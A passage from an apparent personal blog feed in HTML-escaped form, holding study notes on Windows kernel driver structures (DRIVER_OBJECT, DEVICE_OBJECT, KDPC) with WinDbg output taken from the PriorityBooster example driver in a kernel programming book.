+&lt;p&gt;In this case, the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;IopLoadDriver&lt;/code&gt; comes from &lt;code class=&quot;highlighter-rouge&quot;&gt;IopLoadUnloadDriver&lt;/code&gt;. Here’s the source code from the React OS function: &lt;a href=&quot;https://doxygen.reactos.org/d9/d9f/ntoskrnl_2io_2iomgr_2driver_8c_source.html&quot;&gt;https://doxygen.reactos.org/d9/d9f/ntoskrnl_2io_2iomgr_2driver_8c_source.html&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;2-driverobject&quot;&gt;2. DriverObject&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;DriverObject&lt;/code&gt; is defined in &lt;code class=&quot;highlighter-rouge&quot;&gt;wdm.h&lt;/code&gt; as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_DRIVER_OBJECT&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;CSHORT&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;CSHORT&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;PDEVICE_OBJECT&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;DeviceObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// pointer to device objects created by the driver
+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 
+  &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;DriverStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;           
+  &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;DriverSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            
+  &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;DriverSection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         
+  &lt;span class=&quot;n&quot;&gt;PDRIVER_EXTENSION&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;DriverExtension&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// pointer to driver extension
+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;UNICODE_STRING&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;DriverName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             
+  &lt;span class=&quot;n&quot;&gt;PUNICODE_STRING&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;HardwareDatabase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// pointer to the \Registry\Machine\Hardware path to the configuration information in the registry
+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;PFAST_IO_DISPATCH&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;FastIoDispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;        
+  &lt;span class=&quot;n&quot;&gt;PDRIVER_INITIALIZE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DriverInit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// entry point for DriverEntry, setup by I/O manager
+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;PDRIVER_STARTIO&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;DriverStartIo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;         
+  &lt;span class=&quot;n&quot;&gt;PDRIVER_UNLOAD&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;DriverUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// entry point for DriverUnload set by DriverEntry
+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;PDRIVER_DISPATCH&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_MAXIMUM_FUNCTION&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// dispatch table consisting of an array of entry points for the drivers DispatchXxx routines
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DRIVER_OBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PDRIVER_OBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Examination of some of these types:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt _DRIVER_OBJECT
+PriorityBooser!_DRIVER_OBJECT
+   +0x000 Type             : Int2B
+   +0x002 Size             : Int2B
+   +0x008 DeviceObject     : Ptr64 _DEVICE_OBJECT
+   +0x010 Flags            : Uint4B
+   +0x018 DriverStart      : Ptr64 Void
+   +0x020 DriverSize       : Uint4B
+   +0x028 DriverSection    : Ptr64 Void
+   +0x030 DriverExtension  : Ptr64 _DRIVER_EXTENSION
+   +0x038 DriverName       : _UNICODE_STRING
+   +0x048 HardwareDatabase : Ptr64 _UNICODE_STRING
+   +0x050 FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH
+   +0x058 DriverInit       : Ptr64     long 
+   +0x060 DriverStartIo    : Ptr64     void 
+   +0x068 DriverUnload     : Ptr64     void 
+   +0x070 MajorFunction    : [28] Ptr64     long 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt PDEVICE_OBJECT
+PriorityBooster!PDEVICE_OBJECT
+Ptr64    +0x000 Type             : Int2B
+   +0x002 Size             : Uint2B
+   +0x004 ReferenceCount   : Int4B
+   +0x008 DriverObject     : Ptr64 _DRIVER_OBJECT
+   +0x010 NextDevice       : Ptr64 _DEVICE_OBJECT
+   +0x018 AttachedDevice   : Ptr64 _DEVICE_OBJECT
+   +0x020 CurrentIrp       : Ptr64 _IRP
+   +0x028 Timer            : Ptr64 _IO_TIMER
+   +0x030 Flags            : Uint4B
+   +0x034 Characteristics  : Uint4B
+   +0x038 Vpb              : Ptr64 _VPB
+   +0x040 DeviceExtension  : Ptr64 Void
+   +0x048 DeviceType       : Uint4B
+   +0x04c StackSize        : Char
+   +0x050 Queue            : &amp;lt;anonymous-tag&amp;gt;
+   +0x098 AlignmentRequirement : Uint4B
+   +0x0a0 DeviceQueue      : _KDEVICE_QUEUE
+   +0x0c8 Dpc              : _KDPC
+   +0x108 ActiveThreadCount : Uint4B
+   +0x110 SecurityDescriptor : Ptr64 Void
+   +0x118 DeviceLock       : _KEVENT
+   +0x130 SectorSize       : Uint2B
+   +0x132 Spare1           : Uint2B
+   +0x138 DeviceObjectExtension : Ptr64 _DEVOBJ_EXTENSION
+   +0x140 Reserved         : Ptr64 Void
+
+2: kd&amp;gt; dt PDRIVER_EXTENSION
+PriorityBooster!PDRIVER_EXTENSION
+Ptr64    +0x000 DriverObject     : Ptr64 _DRIVER_OBJECT
+   +0x008 AddDevice        : Ptr64     long 
+   +0x010 Count            : Uint4B
+   +0x018 ServiceKeyName   : _UNICODE_STRING
+
+2: kd&amp;gt; dt PFAST_IO_DISPATCH
+PriorityBooster!PFAST_IO_DISPATCH
+Ptr64    +0x000 SizeOfFastIoDispatch : Uint4B
+   +0x008 FastIoCheckIfPossible : Ptr64     unsigned char 
+   +0x010 FastIoRead       : Ptr64     unsigned char 
+   +0x018 FastIoWrite      : Ptr64     unsigned char 
+   +0x020 FastIoQueryBasicInfo : Ptr64     unsigned char 
+   +0x028 FastIoQueryStandardInfo : Ptr64     unsigned char 
+   +0x030 FastIoLock       : Ptr64     unsigned char 
+   +0x038 FastIoUnlockSingle : Ptr64     unsigned char 
+   +0x040 FastIoUnlockAll  : Ptr64     unsigned char 
+   +0x048 FastIoUnlockAllByKey : Ptr64     unsigned char 
+   +0x050 FastIoDeviceControl : Ptr64     unsigned char 
+   +0x058 AcquireFileForNtCreateSection : Ptr64     void 
+   +0x060 ReleaseFileForNtCreateSection : Ptr64     void 
+   +0x068 FastIoDetachDevice : Ptr64     void 
+   +0x070 FastIoQueryNetworkOpenInfo : Ptr64     unsigned char 
+   +0x078 AcquireForModWrite : Ptr64     long 
+   +0x080 MdlRead          : Ptr64     unsigned char 
+   +0x088 MdlReadComplete  : Ptr64     unsigned char 
+   +0x090 PrepareMdlWrite  : Ptr64     unsigned char 
+   +0x098 MdlWriteComplete : Ptr64     unsigned char 
+   +0x0a0 FastIoReadCompressed : Ptr64     unsigned char 
+   +0x0a8 FastIoWriteCompressed : Ptr64     unsigned char 
+   +0x0b0 MdlReadCompleteCompressed : Ptr64     unsigned char 
+   +0x0b8 MdlWriteCompleteCompressed : Ptr64     unsigned char 
+   +0x0c0 FastIoQueryOpen  : Ptr64     unsigned char 
+   +0x0c8 ReleaseForModWrite : Ptr64     long 
+   +0x0d0 AcquireForCcFlush : Ptr64     long 
+   +0x0d8 ReleaseForCcFlush : Ptr64     long 
+
+2: kd&amp;gt; dt PDRIVER_INITIALIZE
+PriorityBooster!PDRIVER_INITIALIZE
+Ptr64  long (
+	_DRIVER_OBJECT*, 
+	_UNICODE_STRING*)
+
+2: kd&amp;gt; dt PDRIVER_STARTIO
+PriorityBooster!PDRIVER_STARTIO
+Ptr64  void (
+	_DEVICE_OBJECT*, 
+	_IRP*)
+
+2: kd&amp;gt; dt PDRIVER_UNLOAD
+PriorityBooster!PDRIVER_UNLOAD
+Ptr64  void (
+	_DRIVER_OBJECT*)
+
+2: kd&amp;gt; dt PDRIVER_DISPATCH
+PriorityBooster!PDRIVER_DISPATCH
+Ptr64  long (
+	_DEVICE_OBJECT*, 
+	_IRP*)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The most relevant structures of these to the study at hand are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PDEVICE_OBJECT DeviceObject&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PDRIVER_DISPATCH MajorFunction&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;First, lets look at &lt;code class=&quot;highlighter-rouge&quot;&gt;PDRIVER_DISPATCH MajorFunction&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// In PriorityBooster DriverEntry
+&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverUnload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PriorityBoosterUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PriorityBoosterCreateClose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_CLOSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PriorityBoosterCreateClose&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MajorFunction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IRP_MJ_DEVICE_CONTROL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PriorityBoosterDeviceControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2: kd&amp;gt; dt DriverObject MajorFunction
+Local var @ 0xffffbe84b6db7918 Type _DRIVER_OBJECT*
+0xfffff800`3de3c7bd 
+   +0x070 MajorFunction : [28] 0x61b8818b`48000000     long  +61b8818b48000000
+2: kd&amp;gt; dx -id 0,0,ffffd502ada73300 -r1 (*((PriorityBooser!long (__cdecl*(*)[28])(_DEVICE_OBJECT *,_IRP *))0xfffff8003de3c82d))
+(*((PriorityBooser!long (__cdecl*(*)[28])(_DEVICE_OBJECT *,_IRP *))0xfffff8003de3c82d))                 [Type: long (__cdecl* [28])(_DEVICE_OBJECT *,_IRP *)]
+    [0]              : 0x61b8818b48000000 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [1]              : 0xfeffff2081f00000 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [2]              : 0x1b80017fc85e8ff [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [3]              : 0x45c0220f44000000 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [4]              : 0x78e8c933d233c033 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [5]              : 0x537d4a058b000018 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [6]              : 0x7401a82e74c08500 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [7]              : 0x72023cc0200f442a [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [8]              : 0x651c7302fe804022 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [9]              : 0x20250c8b48 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [10]             : 0xf0000061b8918b48 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [11]             : 0x38e8fffeffff2281 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [12]             : 0x44ceb60f400017fc [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [13]             : 0x8148c38b48c1220f [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [14]             : 0xc35b5e00000088c4 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [15]             : 0xcccccccccccccccc [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [16]             : 0x8245c8948cccccc [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [17]             : 0x4155415441575655 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [18]             : 0x4950ec8348574156 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [19]             : 0xf98b48da8b48f08b [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [20]             : 0x394674db8548ed33 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [21]             : 0xc9850f00005918ab [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [22]             : 0x8b48d78b48000000 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [23]             : 0xc084000006f5e8cb [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [24]             : 0x3948000000b6850f [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [25]             : 0xa9850f00005970ab [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [26]             : 0x9c8b48c033000000 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+    [27]             : 0xc483480000009024 [Type: long (__cdecl*)(_DEVICE_OBJECT *,_IRP *)]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Each index, of course corresponds to an &lt;code class=&quot;highlighter-rouge&quot;&gt;IRP_MJ_&lt;/code&gt; code&lt;/p&gt;
+
+&lt;h2 id=&quot;3-deviceobject&quot;&gt;3. DeviceObject&lt;/h2&gt;
+
+&lt;p&gt;Device Object is a structure that looks like this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;
+typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _DEVICE_OBJECT {
+    CSHORT Type;                                // Read-only. = 3
+    USHORT Size;                                // Bytes size
+    LONG ReferenceCount;                        // For I/O manager handle tracking
+    struct _DRIVER_OBJECT *DriverObject;        // Set by IoCreateDevice
+    struct _DEVICE_OBJECT *NextDevice;          // ptr to next DeviceObject created by the same driver, if there is any. List updated by I/O manager upon IoCreateDevice*
+    struct _DEVICE_OBJECT *AttachedDevice;      // See MDN doc
+    struct _IRP *CurrentIrp;                    // Obvious. See MDN doc for more
+    PIO_TIMER Timer;                            // Time objet used by I/O manager. Not sure why.
+    ULONG Flags;                                // See above:  DO_...
+    ULONG Characteristics;                      // See ntioapi:  FILE_...
+    __volatile PVPB Vpb;                        // ptr to volume parameter block associated with the device object (what is a VPB?)
+    PVOID DeviceExtension;                      // Important! ptr to device extension. See https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/device-extensions
+    DEVICE_TYPE DeviceType;                     // Set by IO create device. See https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types for a list of possible types
+    CCHAR StackSize;                            // Usually automatically set by I/O manager
+    union {
+        LIST_ENTRY ListEntry;                   // Opaque. Used by the I/O manager. It'd be fun to poke around in the IO manager to see what these are used for.
+        WAIT_CONTEXT_BLOCK Wcb;
+    } Queue;
+    ULONG AlignmentRequirement;                 //
+    KDEVICE_QUEUE DeviceQueue;
+    KDPC Dpc;
+
+    //
+    //  The following field is for exclusive use by the filesystem to keep
+    //  track of the number of Fsp threads currently using the device
+    //
+
+    ULONG ActiveThreadCount;                    // Opaque, apparently reservered for future use. It be fun to see if this is currently used by anyone
+    PSECURITY_DESCRIPTOR SecurityDescriptor;    // Device object SECUR_TY_DESCRIPTOR. Null == default settings. Normally readonly, but can be set by ZwSetSecurityObject function
+    KEVENT DeviceLock;                          // Synchronization object used by I/O manager
+
+    USHORT SectorSize;                          // Normally set to 0, unless the device represents a volume.
+    USHORT Spare1;                              // Reserved for system use. Opaque.
+
+    struct _DEVOBJ_EXTENSION  *DeviceObjectExtension; // Pointer to device object extension for use by I/O and PNP managers
+    PVOID  Reserved;
+
+} DEVICE_OBJECT;
+
+typedef struct _DEVICE_OBJECT *PDEVICE_OBJECT;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and is created by this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C++&quot;&gt;NTSTATUS IoCreateDevice(
+  PDRIVER_OBJECT  DriverObject,
+  ULONG           DeviceExtensionSize,
+  PUNICODE_STRING DeviceName,
+  DEVICE_TYPE     DeviceType,
+  ULONG           DeviceCharacteristics,
+  BOOLEAN         Exclusive,
+  PDEVICE_OBJECT  *DeviceObject
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In the WDM model, device objects are broken into three types:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Physical DO (PDO) - represents device on a bus to a bus driver&lt;/li&gt;
+  &lt;li&gt;Function DO (FDO) - represents a device to a function driver&lt;/li&gt;
+  &lt;li&gt;Filter DO (Filder DO) - repesents a device to a filter driver&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;One of the most important members of the &lt;code class=&quot;highlighter-rouge&quot;&gt;_DEVICE_OBJECT&lt;/code&gt; structure is the &lt;code class=&quot;highlighter-rouge&quot;&gt;Device Extension&lt;/code&gt;. It is driver defined and maintains the state of the driver, and stores important data, including resources allocated by the kernel and data for the drivers I/O operations.&lt;/p&gt;
+
+&lt;p&gt;Memory allocation for this structure and the &lt;code class=&quot;highlighter-rouge&quot;&gt;Device Object&lt;/code&gt; itself are handled by the I/O manager. The memory resides in the nonpaged pool.&lt;/p&gt;
+
+&lt;p&gt;The KDPC memebr of DeviceObject is officially undocumented, but the structure definition can be found in the Windows Reserach Kernel. It looks like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_KDPC&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Importance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;UCHAR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Expedite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LIST_ENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DpcListEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PKDEFERRED_ROUTINE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DeferredRoutine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DeferredContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SystemArgument1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SystemArgument2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DpcData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KDPC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PKDPC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRKDPC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;PriorityBooster creates the DeviceObject accordingly:&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;n&quot;&gt;PDEVICE_OBJECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DeviceObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoCreateDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                      &lt;span class=&quot;c1&quot;&gt;// Automatically set by I/O manager
+&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;devName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               
+		&lt;span class=&quot;n&quot;&gt;FILE_DEVICE_UNKNOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 0x00000022
+&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                      &lt;span class=&quot;c1&quot;&gt;// Characteristics, to be set by I/O manager
+&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                  &lt;span class=&quot;c1&quot;&gt;// Not exclusive
+&lt;/span&gt;		&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceObject&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;p&gt;[1] &lt;a href=&quot;https://leanpub.com/windowskernelprogramming&quot;&gt;https://leanpub.com/windowskernelprogramming&lt;/a&gt;&lt;/p&gt;</content><author><name>Josh Finley</name></author><summary type="html">Chapter 4 of Kernel Programming for Windows walks through the process of developing a driver “from start to finish”. This post is for quick notes on the dissection of this example driver, taken for learning purposes.</summary></entry><entry><title type="html">WinDbg Cheatsheet</title><link href="http://localhost:4000/windbg-cheatsheet/" rel="alternate" type="text/html" title="WinDbg Cheatsheet" /><published>2020-03-16T00:05:28-05:00</published><updated>2020-03-16T00:05:28-05:00</updated><id>http://localhost:4000/windbg-cheatsheet</id><content type="html" xml:base="http://localhost:4000/windbg-cheatsheet/">&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+
+&lt;ul&gt;
